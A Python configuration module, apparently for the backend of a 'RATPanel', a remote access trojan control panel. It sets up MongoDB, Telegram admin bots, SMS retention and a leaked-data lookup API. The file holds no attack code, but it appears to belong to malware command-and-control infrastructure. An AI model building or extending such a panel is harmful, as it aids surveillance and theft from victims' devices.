from pydantic_settings import BaseSettings
from pydantic import ConfigDict, field_validator
from typing import Optional, List, Dict, Any
import json
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent.parent
ENV_FILE = BASE_DIR / ".env"

class Settings(BaseSettings):
    """
    Application settings loaded from environment variables or .env file.
    
    SECURITY WARNING: Never commit .env file or hardcode sensitive values!
    Use .env.example as a template and set actual values in .env file.
    """

    # MongoDB Configuration
    MONGODB_URL: str = "mongodb://username:password@localhost:27017/RATPanel?authSource=admin"
    MONGODB_DB_NAME: str = "RATPanel"
    
    # Redis Configuration
    REDIS_URL: Optional[str] = "redis://localhost:6379/0"

    # Server Configuration
    SERVER_HOST: str = "0.0.0.0"
    SERVER_PORT: int = 80
    DEBUG: bool = True
    
    # Debug Flags
    DEBUG_PING_FLOW: bool = False  # Set to True to enable detailed ping flow logging

    # Security - MUST be set via environment variable in production!
    # Generate a secure key: python -c "import secrets; print(secrets.token_hex(32))"
    SECRET_KEY: str = ""  # REQUIRED: Set via environment variable
    JWT_ALGORITHM: str = "HS256"
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 1440

    # Telegram Bot Configuration
    TELEGRAM_2FA_BOT_TOKEN: Optional[str] = None
    TELEGRAM_2FA_CHAT_ID: Optional[str] = None
    TELEGRAM_ENABLED: bool = True
    
    # Admin Telegram Bots (Optional)
    ADMIN_BOT1_TOKEN: Optional[str] = None
    ADMIN_BOT1_CHAT_ID: str = ""
    ADMIN_BOT2_TOKEN: Optional[str] = None
    ADMIN_BOT2_CHAT_ID: str = ""
    ADMIN_BOT3_TOKEN: Optional[str] = None
    ADMIN_BOT3_CHAT_ID: str = ""
    ADMIN_BOT4_TOKEN: Optional[str] = None
    ADMIN_BOT4_CHAT_ID: str = ""
    ADMIN_BOT5_TOKEN: Optional[str] = None
    ADMIN_BOT5_CHAT_ID: str = ""

    # Telegram Bots JSON (Optional - for dynamic bot configuration)
    TELEGRAM_BOTS: List[Dict[str, Any]] = []

    # LeakOSINT API Configuration
    LEAKOSINT_API_URL: str = "https://leakosintapi.com/"
    LEAKOSINT_API_TOKEN: Optional[str] = None
    LEAKOSINT_KEY_FILE: Optional[str] = None

    @field_validator('TELEGRAM_BOTS', mode='before')
    @classmethod
    def parse_telegram_bots(cls, v):
        if isinstance(v, str):
            try:
                return json.loads(v) if v else []
            except (json.JSONDecodeError, TypeError) as e:
                logger.warning(f"Failed to parse TELEGRAM_BOTS JSON: {e}")
                return []
        return v or []

    PING_INTERVAL: int = 30
    CONNECTION_TIMEOUT: int = 60
    MAX_MESSAGE_SIZE: int = 10 * 1024 * 1024

    SMS_RETENTION_DAYS: int = 180
    LOGS_RETENTION_DAYS: int = 30
    ADMIN_ACTIVITY_RETENTION_DAYS: int = 90

    # Default Admin Account (Only used on first run - change immediately!)
    DEFAULT_ADMIN_USERNAME: str = "admin"
    DEFAULT_ADMIN_PASSWORD: str = ""  # REQUIRED: Set via environment variable
    DEFAULT_ADMIN_EMAIL: str = "admin@example.com"
    DEFAULT_ADMIN_FULL_NAME: str = "Administrator"

    model_config = ConfigDict(
        env_file=str(ENV_FILE),
        env_file_encoding="utf-8",
        case_sensitive=True,
        extra='ignore'
    )

settings = Settings()

# Security validation
if not settings.SECRET_KEY:
    logger.error("⚠️  SECRET_KEY is not set! This is required for security.")
    logger.error("   Generate one with: python -c \"import secrets; print(secrets.token_hex(32))\"")
    logger.error("   Set it in .env file or environment variable.")
    raise ValueError("SECRET_KEY must be set via environment variable or .env file")

if settings.DEBUG and settings.SECRET_KEY:
    # Check if using default/weak secret key
    if len(settings.SECRET_KEY) < 32:
        logger.warning("⚠️  SECRET_KEY is too short! Use at least 32 characters.")

if ENV_FILE.exists():
    logger.info(f"✅ Loading .env file from: {ENV_FILE}")
else:
    logger.warning(f"⚠️  .env file not found at: {ENV_FILE}")
    logger.info("   Using values from environment variables or defaults")
    logger.info("   Copy .env.example to .env and configure your settings")